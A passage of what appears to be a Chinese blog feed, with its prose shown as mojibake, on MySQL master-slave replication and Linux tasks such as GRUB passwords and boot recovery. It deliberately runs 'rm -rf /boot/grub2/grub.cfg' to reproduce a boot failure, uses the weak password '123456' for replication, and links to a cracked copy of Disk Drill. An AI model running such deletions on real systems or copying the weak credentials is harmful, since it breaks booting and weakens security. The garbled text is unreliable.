UUID</h3><p><strong>Master</strong>å’Œ<strong>Slave</strong>å¿…é¡»å…·æœ‰ä¸åŒçš„<strong>UUID</strong>ï¼Œæ‰èƒ½å®ç°ä¸»ä»åŒæ­¥ã€‚<br>æŸ¥çœ‹ <strong>UUID</strong>ï¼š<code>cat /var/lib/mysql/auto.cnf</code><br>å¦‚æœ<strong>UUID</strong>ç›¸åŒåˆ™å¿…é¡»å…ˆä¿®æ”¹<strong>UUID</strong>ç„¶å<strong>é‡å¯</strong>â€‹<strong>MySQL</strong>ã€‚<br>â€‹</p><h3 id="é…ç½®-Master"><a href="#é…ç½®-Master" class="headerlink" title="é…ç½® Master"></a>é…ç½® Master</h3><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ <code>vim /etc/my.cnf</code></p><pre class="line-numbers language-bash"><code class="language-bash">server-id <span class="token operator">=</span> 1     <span class="token comment" spellcheck="true"># ä¸ slave çš„ä¸ç›¸ç­‰</span>log-bin<span class="token operator">=</span>mysqlbin  <span class="token comment" spellcheck="true"># å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½ï¼Œå¯ä»¥éšä¾¿å–</span>binlog-do-db<span class="token operator">=</span>db1  <span class="token comment" spellcheck="true"># é’ˆå¯¹æŸä¸ªæ•°æ®åº“åŒæ­¥ï¼Œç”¨â€œ,â€éš”å¼€å¤šä¸ªæ•°æ®åº“ï¼Œæˆ–è€…binlog-ignore-db=mysql #æŒ‡å®šåº“ä¸åŒæ­¥</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é‡å¯æœåŠ¡</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart mysqld<span class="token comment" spellcheck="true"># OR</span><span class="token function">service</span> mysqld restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç™»å½• <strong>Master</strong> æ•°æ®åº“è¿›è¡Œé…ç½®</p><ol><li>é…ç½® Slave</li></ol><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">grant</span> <span class="token keyword">replication</span> slave <span class="token keyword">on</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">to</span> <span class="token string">'repl'</span>@'<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">2.9</span><span class="token string">' identified by '</span><span class="token number">123456</span>'<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>å¼€å¯è¯»é”ï¼Œä»ä¸»ä¸Šé…ç½®ç»“æŸåè¦è§£é”</li></ol><pre class="line-numbers language-sql"><code class="language-sql">flush <span class="token keyword">tables</span> <span class="token keyword">with</span> <span class="token keyword">read</span> <span class="token keyword">lock</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>æŸ¥çœ‹ Master ä¿¡æ¯</li></ol><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">show</span> master <span class="token keyword">status</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>å®Œæ•´æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">root:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> grant replication slave on *.* to <span class="token string">'repl'</span>@<span class="token string">'192.168.2.9'</span> identified by <span class="token string">'123456'</span><span class="token punctuation">;</span>Query OK, 0 rows affectedTime: 0.003sroot:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> flush tables with <span class="token function">read</span> lock<span class="token punctuation">;</span>Query OK, 0 rows affectedTime: 0.002sroot:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> show master status<span class="token punctuation">;</span>+-----------------+----------+--------------+------------------+-------------------+<span class="token operator">|</span> File            <span class="token operator">|</span> Position <span class="token operator">|</span> Binlog_Do_DB <span class="token operator">|</span> Binlog_Ignore_DB <span class="token operator">|</span> Executed_Gtid_Set <span class="token operator">|</span>+-----------------+----------+--------------+------------------+-------------------+<span class="token operator">|</span> mysqlbin.000001 <span class="token operator">|</span> 447      <span class="token operator">|</span> db1          <span class="token operator">|</span>                  <span class="token operator">|</span>                   <span class="token operator">|</span>+-----------------+----------+--------------+------------------+-------------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span>Time: 0.010s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é…ç½®-Slave"><a href="#é…ç½®-Slave" class="headerlink" title="é…ç½® Slave"></a>é…ç½® Slave</h3><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ <code>vim /etc/my.cnf</code></p><pre class="line-numbers language-bash"><code class="language-bash">server-id<span class="token operator">=</span>2         <span class="token comment" spellcheck="true"># ä¸ master çš„ä¸ç›¸ç­‰</span>relay_log<span class="token operator">=</span>relaybin  <span class="token comment" spellcheck="true"># é…ç½®ä¸­ç»§æ—¥å¿—</span>binlog-do-db<span class="token operator">=</span>db1    <span class="token comment" spellcheck="true"># é’ˆå¯¹æŸä¸ªæ•°æ®åº“åŒæ­¥ï¼Œç”¨â€œ,â€éš”å¼€å¤šä¸ªæ•°æ®åº“ï¼Œæˆ–è€…binlog-ignore-db=mysql #æŒ‡å®šåº“ä¸åŒæ­¥</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é‡å¯æœåŠ¡</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart mysqld<span class="token comment" spellcheck="true"># OR</span><span class="token function">service</span> mysqld restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç™»å½• <strong>Slave</strong> æ•°æ®åº“è¿›è¡Œé…ç½®</p><ol><li>å…ˆåœæ­¢ä¸»ä»</li></ol><pre class="line-numbers language-sql"><code class="language-sql">stop slave<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// OR</span>slave stop<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>å…³é”®ä¸€æ­¥ï¼Œæ ¹æ® <strong>Master</strong> ä¸Š <code>show master status</code> æ˜¾ç¤ºçš„ä¿¡æ¯è¿›è¡Œé…ç½®<ol><li>master_host ï¼šMaster çš„åœ°å€</li><li>master_portï¼šMaster çš„ç«¯å£å·</li><li>master_userï¼šç”¨äºæ•°æ®åŒæ­¥çš„ç”¨æˆ·</li><li>master_passwordï¼šç”¨äºåŒæ­¥çš„ç”¨æˆ·çš„å¯†ç </li><li>master_log_fileï¼šæŒ‡å®š Slave ä»å“ªä¸ªæ—¥å¿—æ–‡ä»¶å¼€å§‹å¤åˆ¶æ•°æ®</li><li>master_log_posï¼šä»å“ªä¸ª Position å¼€å§‹è¯» â€‹</li></ol></li></ol><pre class="line-numbers language-sql"><code class="language-sql">change master <span class="token keyword">to</span> master_host<span class="token operator">=</span><span class="token string">'192.168.2.8'</span><span class="token punctuation">,</span>master_port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>master_user<span class="token operator">=</span><span class="token string">'repl'</span><span class="token punctuation">,</span>master_password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">,</span>master_log_file<span class="token operator">=</span><span class="token string">'mysqlbin.000001'</span><span class="token punctuation">,</span>master_log_pos<span class="token operator">=</span><span class="token number">447</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>å¼€å¯ Slave</li></ol><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">start</span> slave<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>æŸ¥çœ‹ Slave çŠ¶æ€</li></ol><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">show</span> slave <span class="token keyword">status</span>\G<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>ä¸¤ä¸ª yes è¡¨ç¤ºæˆåŠŸ<br>â€¦<br>Slave_IO_Running: Yes<br>Slave_SQL_Running: Yes<br>â€¦</p></blockquote><p>å®Œæ•´æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-sql"><code class="language-sql">root:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> stop slave<span class="token punctuation">;</span>Query OK<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">rows</span> affectedTime: <span class="token number">0</span><span class="token punctuation">.</span>002sroot:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> change master <span class="token keyword">to</span> master_host<span class="token operator">=</span><span class="token string">'192.168.2.8'</span><span class="token punctuation">,</span> master_user<span class="token operator">=</span><span class="token string">'repl'</span><span class="token punctuation">,</span> master_password<span class="token operator">=</span><span class="token string">'123456'</span>          <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">,</span> master_port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span> master_log_file<span class="token operator">=</span><span class="token string">'mysqlbin.000001'</span><span class="token punctuation">,</span> master_log_pos<span class="token operator">=</span><span class="token number">447</span><span class="token punctuation">;</span>Query OK<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">rows</span> affectedTime: <span class="token number">0</span><span class="token punctuation">.</span>006sroot:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">start</span> slave<span class="token punctuation">;</span>Query OK<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">rows</span> affectedTime: <span class="token number">0</span><span class="token punctuation">.</span>003sroot:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> slave <span class="token keyword">status</span> \G<span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">.</span> <span class="token keyword">row</span> <span class="token punctuation">]</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>Slave_IO_State                <span class="token operator">|</span>Master_Host                   <span class="token operator">|</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">2.8</span>Master_User                   <span class="token operator">|</span> replMaster_Port                   <span class="token operator">|</span> <span class="token number">3306</span>Connect_Retry                 <span class="token operator">|</span> <span class="token number">30</span>Master_Log_File               <span class="token operator">|</span> mysqlbin<span class="token number">.000001</span>Read_Master_Log_Pos           <span class="token operator">|</span> <span class="token number">447</span>Relay_Log_File                <span class="token operator">|</span> relaybin<span class="token number">.000001</span>Relay_Log_Pos                 <span class="token operator">|</span> <span class="token number">4</span>Relay_Master_Log_File         <span class="token operator">|</span> mysqlbin<span class="token number">.000001</span>Slave_IO_Running              <span class="token operator">|</span> YesSlave_SQL_Running             <span class="token operator">|</span> YesReplicate_Do_DB               <span class="token operator">|</span>Replicate_Ignore_DB           <span class="token operator">|</span>Replicate_Do_Table            <span class="token operator">|</span>Replicate_Ignore_Table        <span class="token operator">|</span>Replicate_Wild_Do_Table       <span class="token operator">|</span>Replicate_Wild_Ignore_Table   <span class="token operator">|</span>Last_Errno                    <span class="token operator">|</span> <span class="token number">0</span>Last_Error                    <span class="token operator">|</span>Skip_Counter                  <span class="token operator">|</span> <span class="token number">0</span>Exec_Master_Log_Pos           <span class="token operator">|</span> <span class="token number">447</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span>Time: <span class="token number">0</span><span class="token punctuation">.</span>004s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰ã€ä¸»ä»çš„ä¿®å¤"><a href="#ä¸‰ã€ä¸»ä»çš„ä¿®å¤" class="headerlink" title="ä¸‰ã€ä¸»ä»çš„ä¿®å¤"></a>ä¸‰ã€ä¸»ä»çš„ä¿®å¤</h2><h3 id="é‡å¯-Slave"><a href="#é‡å¯-Slave" class="headerlink" title="é‡å¯ Slave"></a>é‡å¯ Slave</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">></span> stop slave<span class="token punctuation">;</span><span class="token operator">></span> <span class="token keyword">start</span> slave<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="æŸ¥çœ‹-MySQL-æ—¥å¿—"><a href="#æŸ¥çœ‹-MySQL-æ—¥å¿—" class="headerlink" title="æŸ¥çœ‹ MySQL æ—¥å¿—"></a>æŸ¥çœ‹ MySQL æ—¥å¿—</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /var/log/mysqld.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœä»¥ä¸Šçš„æ–¹æ³•ä¸æˆåŠŸï¼Œå°±åªèƒ½é‡æ–°ä½œä¸»ä»äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> äº‘è®¡ç®— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> é«˜å¯ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux é«˜çº§æ“ä½œ</title>
      <link href="/post/94ac57e3.html"/>
      <url>/post/94ac57e3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-é«˜çº§æ“ä½œ"><a href="#Linux-é«˜çº§æ“ä½œ" class="headerlink" title="Linux é«˜çº§æ“ä½œ"></a>Linux é«˜çº§æ“ä½œ</h1><h2 id="0x01-å¼€æœºè‡ªåŠ¨æ‰§è¡ŒæŸä¸ªå‘½ä»¤"><a href="#0x01-å¼€æœºè‡ªåŠ¨æ‰§è¡ŒæŸä¸ªå‘½ä»¤" class="headerlink" title="0x01 å¼€æœºè‡ªåŠ¨æ‰§è¡ŒæŸä¸ªå‘½ä»¤"></a>0x01 å¼€æœºè‡ªåŠ¨æ‰§è¡ŒæŸä¸ªå‘½ä»¤</h2><p>æŠŠéœ€è¦æ‰§è¡Œçš„å‘½ä»¤å†™å…¥åˆ°ï¼š**/etc/rc.local** ä¸­<br>â€‹</p><h2 id="0x02-grub-åŠ å¯†"><a href="#0x02-grub-åŠ å¯†" class="headerlink" title="0x02 grub åŠ å¯†"></a>0x02 grub åŠ å¯†</h2><p>ç›®çš„ï¼šç»™ grub åŠ å¯†ï¼Œä¸è®©åˆ«äººé€šè¿‡ grub è¿›å…¥å•ç”¨æˆ·æ¨¡å¼</p><h3 id="RHEL-6ã€CentOS-6"><a href="#RHEL-6ã€CentOS-6" class="headerlink" title="RHEL 6ã€CentOS 6"></a>RHEL 6ã€CentOS 6</h3><p>ä½¿ç”¨ <code>grub-md5-crypt</code> å‘½ä»¤ç”Ÿæˆå¯†ç </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@rhel6 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># grub-md5-crypt</span>Password:Retype password:<span class="token variable">$1</span><span class="token variable">$ruj8a1</span><span class="token variable">$T0lsmfoMmORJ</span>.se7AKvUl1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ <code>hiddenmenu</code> ä¸‹ä¸€è¡Œæ·»åŠ ï¼š<br><code>password --md5 $1$ruj8a1$T0lsmfoMmORJ.se7AKvUl1</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628069334881-bb8208c6-1656-4f4d-ab4f-466765fd4b42.png#clientId=u65c2b298-b3ee-4&amp;from=paste&amp;height=525&amp;id=udf78fb31&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=525&amp;originWidth=871&amp;originalType=binary%E2%88%B6=1&amp;size=235047&amp;status=done&amp;style=none&amp;taskId=u414f6371-0f51-41f6-9ed1-1e26068e374&amp;width=871" alt="image.png"></p><p>è®¾ç½®å®Œæˆï¼<br>â€‹</p><h3 id="RHEL-7ã€CentOS-7"><a href="#RHEL-7ã€CentOS-7" class="headerlink" title="RHEL 7ã€CentOS 7"></a>RHEL 7ã€CentOS 7</h3><p>ä½¿ç”¨ <code>grub2-mkpasswd-pbkdf2</code> å‘½ä»¤ç”Ÿæˆå¯†ç </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@rhel01 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># grub2-mkpasswd-pbkdf2</span>Enter password:Reenter password:PBKDF2 <span class="token function">hash</span> of your password is grub.pbkdf2.sha512.10000.5E91E83A27E2C7963D35EF37D2084A4EA57D192014837AB880073C6A342776D4E5E2DEB8F4F7CA394E04E5226F964256F47F09B57E29135C77B26AB4C4CA17CA.C418BD2BA01F84FEEB682567ABB7F259E3188133FF634A04CE444DECB8579C088AC97ED2A2CFB8F45D5AD42A671FB8FB14361758A32A9C5116D419ABB00351D5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ <strong>/etc/grub.d/00_header</strong> æ–‡ä»¶æœ€åè¿½åŠ ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token operator">&lt;&lt;</span> <span class="token string">EOFset superusers='truda'password_pbkdf2 truda grub.pbkdf2.sha512.10000.5E91E83A27E2C7963D35EF37D2084A4EA57D192014837AB880073C6A342776D4E5E2DEB8F4F7CA394E04E5226F964256F47F09B57E29135C77B26AB4C4CA17CA.C418BD2BA01F84FEEB682567ABB7F259E3188133FF634A04CE444DECB8579C088AC97ED2A2CFB8F45D5AD42A671FB8FB14361758A32A9C5116D419ABB00351D5EOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-æ‰‹åŠ¨å¼•å¯¼-Linux"><a href="#0x03-æ‰‹åŠ¨å¼•å¯¼-Linux" class="headerlink" title="0x03 æ‰‹åŠ¨å¼•å¯¼ Linux"></a>0x03 æ‰‹åŠ¨å¼•å¯¼ Linux</h2><h3 id="GRUB-ç®€ä»‹"><a href="#GRUB-ç®€ä»‹" class="headerlink" title="GRUB ç®€ä»‹"></a>GRUB ç®€ä»‹</h3><p>GNU GRUBï¼ˆGRand Unified Bootloader ç®€ç§°â€œGRUBâ€ï¼‰æ˜¯ä¸€ä¸ªæ¥è‡ª GNU é¡¹ç›®çš„å¤šæ“ä½œç³»ç»Ÿå¯åŠ¨ç¨‹åºã€‚GRUB æ˜¯å¤šå¯åŠ¨è§„èŒƒçš„å®ç°ï¼Œå®ƒå…è®¸ç”¨æˆ·å¯ä»¥åœ¨è®¡ç®—æœºå†…åŒæ—¶æ‹¥æœ‰å¤šä¸ªæ“ä½œç³»ç»Ÿï¼Œå¹¶åœ¨è®¡ç®—æœºå¯åŠ¨æ—¶é€‰æ‹©å¸Œæœ›è¿è¡Œçš„æ“ä½œç³»ç»Ÿã€‚GRUB å¯ç”¨äºé€‰æ‹©æ“ä½œç³»ç»Ÿåˆ†åŒºä¸Šçš„ä¸åŒå†…æ ¸ï¼Œä¹Ÿå¯ç”¨äºå‘è¿™äº›å†…æ ¸ä¼ é€’å¯åŠ¨å‚æ•°ã€‚<br>â€‹</p><p>ä»¥ä¸‹æ“ä½œç¯å¢ƒï¼šRed Hat Enterprise Linux Server release 7.3<br>å‚è€ƒï¼š<br><a href="https://www.linux.com/training-tutorials/how-rescue-non-booting-grub-2-linux/">å¦‚ä½•åœ¨ Linux ä¸Šæ‹¯æ•‘æ— æ³•å¯åŠ¨çš„ GRUB 2</a><br><a href="https://medium.com/analytics-vidhya/rescuing-a-non-booting-grub-on-ubuntu-grub-rescue-4e10c9a4ff07">åœ¨ Ubuntu ä¸Šæ‹¯æ•‘ä¸€ä¸ªæ— æ³•å¯åŠ¨çš„ GRUB</a><br>â€‹</p><h3 id="æ•…éšœé‡ç°"><a href="#æ•…éšœé‡ç°" class="headerlink" title="æ•…éšœé‡ç°"></a>æ•…éšœé‡ç°</h3><p>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯å¹¶é‡ç°æ•…éšœï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># lsb_release -a</span>LSB Version:    :core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarchDistributor ID:    RedHatEnterpriseServerDescription:    Red Hat Enterprise Linux Server release 7.3 <span class="token punctuation">(</span>Maipo<span class="token punctuation">)</span>Release:    7.3Codename:    Maipo<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># df -h</span>Filesystem Size Used Avail Use% Mounted on/dev/mapper/rhel-root 50G 22G 29G 43% /devtmpfs 1.9G 0 1.9G 0% /devtmpfs 1.9G 88K 1.9G 1% /dev/shmtmpfs 1.9G 9.0M 1.9G 1% /runtmpfs 1.9G 0 1.9G 0% /sys/fs/cgroup/dev/sda1 1014M 174M 841M 18% /boot/dev/sr0 3.6G 3.6G 0 100% /media/cdrom/dev/mapper/rhel-home 46G 33M 46G 1% /hometmpfs 378M 8.0K 378M 1% /run/user/0<span class="token punctuation">[</span>root@localhost grub2<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># grub2-install -V</span>grub2-install <span class="token punctuation">(</span>GRUB<span class="token punctuation">)</span> 2.02~beta2<span class="token comment" spellcheck="true">#ç”¨grub2-install --versionä¹Ÿå¯ä»¥æŸ¥çœ‹grubç‰ˆæœ¬ä¿¡æ¯</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ls /boot/grub2/</span>device.map fonts grub.cfg grubenv i386-pc locale themes<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># rm -rf /boot/grub2/grub.cfg</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ•…éšœé‡ç°<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628127533273-e7c4f4a5-a448-4297-9e36-c9c0152ed96c.png#clientId=ued7665ec-d28d-4&amp;from=paste&amp;height=111&amp;id=u922239fe&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=111&amp;originWidth=634&amp;originalType=binary%E2%88%B6=1&amp;size=6539&amp;status=done&amp;style=none&amp;taskId=u6b7ddec9-a264-4059-b2ae-819d8c940d7&amp;width=634" alt="image.png"></p><h3 id="æ‰‹åŠ¨å¼•å¯¼ç³»ç»Ÿ"><a href="#æ‰‹åŠ¨å¼•å¯¼ç³»ç»Ÿ" class="headerlink" title="æ‰‹åŠ¨å¼•å¯¼ç³»ç»Ÿ"></a>æ‰‹åŠ¨å¼•å¯¼ç³»ç»Ÿ</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628127540624-f2d4d5d5-3538-487d-a49e-4f9d1f556c8b.png#clientId=ued7665ec-d28d-4&amp;from=paste&amp;height=278&amp;id=u8f836f5d&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=278&amp;originWidth=705&amp;originalType=binary%E2%88%B6=1&amp;size=20828&amp;status=done&amp;style=none&amp;taskId=ue8500e05-9928-456f-93ad-b6875992702&amp;width=705" alt="image.png"></p><h3 id="é‡è£…-grub"><a href="#é‡è£…-grub" class="headerlink" title="é‡è£… grub"></a>é‡è£… grub</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ls /boot/grub2/</span>device.map fonts grubenv i386-pc locale themes<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># grub2-mkconfig > /boot/grub2/grub.cfg</span>Generating grub configuration <span class="token function">file</span> <span class="token punctuation">..</span>.Found linux image: /boot/vmlinuz-3.10.0-514.el7.x86_64Found initrd image: /boot/initramfs-3.10.0-514.el7.x86_64.imgFound linux image: /boot/vmlinuz-0-rescue-f0bcb62b11a44643824cde1c7f3833e4Found initrd image: /boot/initramfs-0-rescue-f0bcb62b11a44643824cde1c7f3833e4.img<span class="token keyword">done</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ls /boot/grub2/</span>device.map fonts grub.cfg grubenv i386-pc locale themes<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é‡å¯éªŒè¯ä¿®å¤ç»“æœ"><a href="#é‡å¯éªŒè¯ä¿®å¤ç»“æœ" class="headerlink" title="é‡å¯éªŒè¯ä¿®å¤ç»“æœ"></a>é‡å¯éªŒè¯ä¿®å¤ç»“æœ</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628127562509-ea02653f-9652-4be8-9365-cac4d7c99ce9.png#clientId=ued7665ec-d28d-4&amp;from=paste&amp;height=459&amp;id=u67d4091b&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=459&amp;originWidth=541&amp;originalType=binary%E2%88%B6=1&amp;size=159061&amp;status=done&amp;style=none&amp;taskId=u7feff94f-fd7f-4532-a503-f0d75d2f7d9&amp;width=541" alt="image.png"><br>é‡å¯åèƒ½å†æ¬¡æˆåŠŸè¿›å…¥ç³»ç»Ÿï¼Œè¯´æ˜ä¿®å¤æˆåŠŸï¼<br>â€‹</p><h2 id="0x04-æ–‡ä»¶æ¢å¤å·¥å…·"><a href="#0x04-æ–‡ä»¶æ¢å¤å·¥å…·" class="headerlink" title="0x04 æ–‡ä»¶æ¢å¤å·¥å…·"></a>0x04 æ–‡ä»¶æ¢å¤å·¥å…·</h2><h3 id="Linux-è¯¯åˆ æ–‡ä»¶æ¢å¤å·¥å…·"><a href="#Linux-è¯¯åˆ æ–‡ä»¶æ¢å¤å·¥å…·" class="headerlink" title="Linux è¯¯åˆ æ–‡ä»¶æ¢å¤å·¥å…·"></a>Linux è¯¯åˆ æ–‡ä»¶æ¢å¤å·¥å…·</h3><ul><li>ext4 æ–‡ä»¶ç³»ç»Ÿ: <strong>extundelete</strong></li><li>ext3 æ–‡ä»¶ç³»ç»Ÿï¼š<strong>ext3grep</strong></li></ul><p>â€‹</p><h3 id="å¯è§†åŒ–æ–‡ä»¶æ¢å¤å·¥å…·"><a href="#å¯è§†åŒ–æ–‡ä»¶æ¢å¤å·¥å…·" class="headerlink" title="å¯è§†åŒ–æ–‡ä»¶æ¢å¤å·¥å…·"></a>å¯è§†åŒ–æ–‡ä»¶æ¢å¤å·¥å…·</h3><ul><li>Windows å’Œ Mac OSï¼šDisk Drillï¼ˆ<a href="https://www.macwk.com/soft/disk-drill">Mac OS Disk Drill ä¸­æ–‡ç ´è§£ç‰ˆ</a>ï¼‰</li></ul><p>â€‹</p><h2 id="0x05-å»é™¤é…ç½®æ–‡ä»¶æ³¨é‡Šè¡Œ"><a href="#0x05-å»é™¤é…ç½®æ–‡ä»¶æ³¨é‡Šè¡Œ" class="headerlink" title="0x05 å»é™¤é…ç½®æ–‡ä»¶æ³¨é‡Šè¡Œ"></a>0x05 å»é™¤é…ç½®æ–‡ä»¶æ³¨é‡Šè¡Œ</h2><h3 id="å¤‡ä»½æ–‡ä»¶"><a href="#å¤‡ä»½æ–‡ä»¶" class="headerlink" title="å¤‡ä»½æ–‡ä»¶"></a>å¤‡ä»½æ–‡ä»¶</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> test.conf test.conf.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 